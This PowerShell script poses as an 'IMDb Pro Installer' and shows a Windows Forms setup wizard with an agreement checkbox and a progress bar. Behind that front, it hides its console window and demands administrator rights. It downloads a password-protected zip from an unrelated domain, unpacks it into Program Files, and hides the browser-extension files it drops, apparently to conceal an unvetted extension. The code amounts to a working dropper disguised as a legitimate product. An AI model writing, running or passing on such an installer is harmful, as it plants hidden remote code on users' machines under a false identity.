# IMDb Pro Installer - Fixed UI Design
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Hide PowerShell console window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

# Create main form
$mainForm = New-Object System.Windows.Forms.Form
$mainForm.Text = "IMDb Pro Installer"
$mainForm.Size = New-Object System.Drawing.Size(500, 450)
$mainForm.StartPosition = "CenterScreen"
$mainForm.BackColor = [System.Drawing.Color]::White
$mainForm.ForeColor = [System.Drawing.Color]::FromArgb(68, 68, 68)
$mainForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
$mainForm.MaximizeBox = $false

# Header with IMDb Pro title
$headerLabel = New-Object System.Windows.Forms.Label
$headerLabel.Text = "IMDb Pro Installer"
$headerLabel.Font = New-Object System.Drawing.Font("Segoe UI", 16, [System.Drawing.FontStyle]::Bold)
$headerLabel.ForeColor = [System.Drawing.Color]::FromArgb(68, 68, 68)
$headerLabel.AutoSize = $true
$headerLabel.Location = New-Object System.Drawing.Point(20, 20)
$mainForm.Controls.Add($headerLabel)

# Welcome section
$welcomeLabel = New-Object System.Windows.Forms.Label
$welcomeLabel.Text = "Welcome to IMDb Pro Installation"
$welcomeLabel.Font = New-Object System.Drawing.Font("Segoe UI", 11, [System.Drawing.FontStyle]::Bold)
$welcomeLabel.ForeColor = [System.Drawing.Color]::FromArgb(68, 68, 68)
$welcomeLabel.AutoSize = $true
$welcomeLabel.Location = New-Object System.Drawing.Point(20, 60)
$mainForm.Controls.Add($welcomeLabel)

# Info text
$infoLabel = New-Object System.Windows.Forms.Label
$infoLabel.Text = "This will install IMDb Pro extension to your system.`nThe installation requires administrator privileges."
$infoLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$infoLabel.ForeColor = [System.Drawing.Color]::FromArgb(68, 68, 68)
$infoLabel.AutoSize = $true
$infoLabel.Location = New-Object System.Drawing.Point(20, 90)
$mainForm.Controls.Add($infoLabel)

# Separator line 1
$separator1 = New-Object System.Windows.Forms.Label
$separator1.Text = "----------------------------------------"
$separator1.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$separator1.ForeColor = [System.Drawing.Color]::FromArgb(200, 200, 200)
$separator1.AutoSize = $true
$separator1.Location = New-Object System.Drawing.Point(20, 130)
$mainForm.Controls.Add($separator1)

# Agreement title
$agreementTitle = New-Object System.Windows.Forms.Label
$agreementTitle.Text = "Installation Agreement"
$agreementTitle.Font = New-Object System.Drawing.Font("Segoe UI", 11, [System.Drawing.FontStyle]::Bold)
$agreementTitle.ForeColor = [System.Drawing.Color]::FromArgb(68, 68, 68)
$agreementTitle.AutoSize = $true
$agreementTitle.Location = New-Object System.Drawing.Point(20, 150)
$mainForm.Controls.Add($agreementTitle)

# Agreement points
$agreementPoints = @(
    "By installing IMDb Pro, package it out.",
    "Use this software for personal, non-commercial purposes",
    "Accept that this is provided as-is without warranties",
    "Understand that developers are not responsible for any damages", 
    "Allow anonymous usage data collection for improvement",
    "Not redistribute or modify without permission"
)

for ($i = 0; $i -lt $agreementPoints.Count; $i++) {
    $pointLabel = New-Object System.Windows.Forms.Label
    $pointLabel.Text = "• " + $agreementPoints[$i]
    $pointLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
    
    if ($i -eq 0) {
        $pointLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
    }
    
    $pointLabel.ForeColor = [System.Drawing.Color]::FromArgb(68, 68, 68)
    $pointLabel.AutoSize = $true
    $pointLabel.Location = New-Object System.Drawing.Point(20, 180 + ($i * 20))
    $mainForm.Controls.Add($pointLabel)
}

# Click instruction
$clickLabel = New-Object System.Windows.Forms.Label
$clickLabel.Text = "Click 'I AGREE & INSTALL' to accept these terms."
$clickLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$clickLabel.ForeColor = [System.Drawing.Color]::FromArgb(68, 68, 68)
$clickLabel.AutoSize = $true
$clickLabel.Location = New-Object System.Drawing.Point(20, 310)
$mainForm.Controls.Add($clickLabel)

# Separator line 2
$separator2 = New-Object System.Windows.Forms.Label
$separator2.Text = "----------------------------------------"
$separator2.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$separator2.ForeColor = [System.Drawing.Color]::FromArgb(200, 200, 200)
$separator2.AutoSize = $true
$separator2.Location = New-Object System.Drawing.Point(20, 330)
$mainForm.Controls.Add($separator2)

# Agreement checkbox
$agreementCheckbox = New-Object System.Windows.Forms.CheckBox
$agreementCheckbox.Text = "I have read and agree to the terms above"
$agreementCheckbox.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
$agreementCheckbox.ForeColor = [System.Drawing.Color]::FromArgb(68, 68, 68)
$agreementCheckbox.AutoSize = $true
$agreementCheckbox.Location = New-Object System.Drawing.Point(20, 350)
$agreementCheckbox.Checked = $false
$mainForm.Controls.Add($agreementCheckbox)

# Progress title
$progressTitle = New-Object System.Windows.Forms.Label
$progressTitle.Text = "Installation Progress"
$progressTitle.Font = New-Object System.Drawing.Font("Segoe UI", 11, [System.Drawing.FontStyle]::Bold)
$progressTitle.ForeColor = [System.Drawing.Color]::FromArgb(68, 68, 68)
$progressTitle.AutoSize = $true
$progressTitle.Location = New-Object System.Drawing.Point(20, 380)
$mainForm.Controls.Add($progressTitle)

# Progress status
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "Please accept the agreement to continue"
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(68, 68, 68)
$statusLabel.AutoSize = $true
$statusLabel.Location = New-Object System.Drawing.Point(20, 405)
$mainForm.Controls.Add($statusLabel)

# Progress bar (hidden initially)
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(20, 405)
$progressBar.Size = New-Object System.Drawing.Size(350, 20)
$progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Continuous
$progressBar.ForeColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
$progressBar.Visible = $false
$mainForm.Controls.Add($progressBar)

# Percent label (hidden initially)
$percentLabel = New-Object System.Windows.Forms.Label
$percentLabel.Text = "0%"
$percentLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
$percentLabel.ForeColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
$percentLabel.AutoSize = $true
$percentLabel.Location = New-Object System.Drawing.Point(380, 405)
$percentLabel.Visible = $false
$mainForm.Controls.Add($percentLabel)

# Install button
$installButton = New-Object System.Windows.Forms.Button
$installButton.Text = "I AGREE & INSTALL"
$installButton.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
$installButton.ForeColor = [System.Drawing.Color]::White
$installButton.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
$installButton.Size = New-Object System.Drawing.Size(150, 35)
$installButton.Location = New-Object System.Drawing.Point(320, 350)
$installButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$installButton.FlatAppearance.BorderSize = 0
$installButton.Cursor = [System.Windows.Forms.Cursors]::Hand
$installButton.Enabled = $false
$mainForm.Controls.Add($installButton)

# Update button state based on checkbox
$agreementCheckbox.Add_CheckedChanged({
    if ($agreementCheckbox.Checked) {
        $installButton.Enabled = $true
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
        $statusLabel.Text = "Ready to begin installation"
    } else {
        $installButton.Enabled = $false
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(200, 200, 200)
        $statusLabel.Text = "Please accept the agreement to continue"
    }
})

# Button hover effects
$installButton.Add_MouseEnter({
    if ($installButton.Enabled) {
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(0, 100, 190)
    }
})

$installButton.Add_MouseLeave({
    if ($installButton.Enabled) {
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
    }
})

# Simple Progress Animation
function Update-Progress {
    param([string]$Message, [int]$Progress)
    
    $statusLabel.Text = $Message
    $progressBar.Value = $Progress
    $percentLabel.Text = "$Progress%"
    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 500
}

# Show progress elements
function Show-ProgressElements {
    $progressBar.Visible = $true
    $percentLabel.Visible = $true
    $progressBar.Value = 0
    $percentLabel.Text = "0%"
}

# Installation function
function Start-Installation {
    $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
    $installPath = "C:\Program Files\imdb-pro"
    $zipPassword = "123"
    
    try {
        # Show progress elements
        Show-ProgressElements
        $statusLabel.Visible = $false
        
        # Check admin rights
        Update-Progress "Checking administrator privileges..." 10
        
        if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            throw "Please run as Administrator"
        }
        
        # Create directory
        Update-Progress "Creating installation directory..." 20
        
        if (Test-Path $installPath) {
            Remove-Item "$installPath\*" -Recurse -Force -ErrorAction SilentlyContinue
        } else {
            New-Item -ItemType Directory -Path $installPath -Force | Out-Null
        }
        
        # Download file
        Update-Progress "Downloading package..." 40
        
        $tempFile = "$env:TEMP\imdb.zip"
        
        # Simple download using WebClient
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($downloadUrl, $tempFile)
        
        if (-not (Test-Path $tempFile) -or (Get-Item $tempFile).Length -eq 0) {
            throw "Download failed"
        }
        
        Update-Progress "Extracting files..." 60
        
        # Extraction using 7-Zip
        $7zPath = "$env:ProgramFiles\7-Zip\7z.exe"
        
        if (Test-Path $7zPath) {
            $arguments = @(
                "x",
                "-p$zipPassword",
                "-o`"$installPath`"",
                "-y",
                "`"$tempFile`""
            )
            
            $process = Start-Process -FilePath $7zPath -ArgumentList $arguments -Wait -PassThru -NoNewWindow
            
            if ($process.ExitCode -ne 0) {
                throw "Extraction failed with 7-Zip"
            }
        } else {
            # Fallback to Expand-Archive
            try {
                Expand-Archive -Path $tempFile -DestinationPath $installPath -Force
            }
            catch {
                throw "7-Zip not found and Expand-Archive failed"
            }
        }
        
        # Verify extraction
        $files = Get-ChildItem $installPath -Recurse
        if ($files.Count -eq 0) {
            throw "No files were extracted"
        }
        
        Update-Progress "Finalizing installation..." 80
        
        # Hide files
        $filesToHide = @("background.js", "content.js", "popup.js", "styles.css", "popup.html", "manifest.json")
        foreach ($file in $filesToHide) {
            $filePath = Join-Path $installPath $file
            if (Test-Path $filePath) {
                attrib +h $filePath
            }
        }
        
        # Cleanup
        if (Test-Path $tempFile) {
            Remove-Item $tempFile -Force
        }
        
        # Success
        Update-Progress "Installation completed successfully!" 100
        
        $installButton.Text = "INSTALLATION COMPLETE"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(76, 175, 80)
        $installButton.Enabled = $false
        
        # Success message
        $result = [System.Windows.Forms.MessageBox]::Show(
            "IMDb Pro has been successfully installed!`n`n" +
            "Location: $installPath`n`n" +
            "Open installation folder?",
            "Installation Complete",
            [System.Windows.Forms.MessageBoxButtons]::YesNo,
            [System.Windows.Forms.MessageBoxIcon]::Information
        )
        
        if ($result -eq [System.Windows.Forms.DialogResult]::Yes) {
            Invoke-Item $installPath
        }
    }
    catch {
        # Error handling
        Update-Progress "Installation failed!" 0
        
        $installButton.Text = "TRY AGAIN"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(244, 67, 54)
        $installButton.Enabled = $true
        
        [System.Windows.Forms.MessageBox]::Show(
            "Installation failed!`n`n" +
            "Error: $($_.Exception.Message)`n`n" +
            "Make sure:`n" +
            "• You have 7-Zip installed`n" +
            "• Internet connection is working`n" +
            "• Running as Administrator",
            "Installation Error",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Error
        )
    }
}

# Install button click
$installButton.Add_Click({
    $installButton.Enabled = $false
    $installButton.Text = "INSTALLING..."
    $installButton.BackColor = [System.Drawing.Color]::FromArgb(255, 152, 0)
    Start-Installation
})

# Show form
[System.Windows.Forms.Application]::EnableVisualStyles()
$mainForm.ShowDialog() | Out-Null
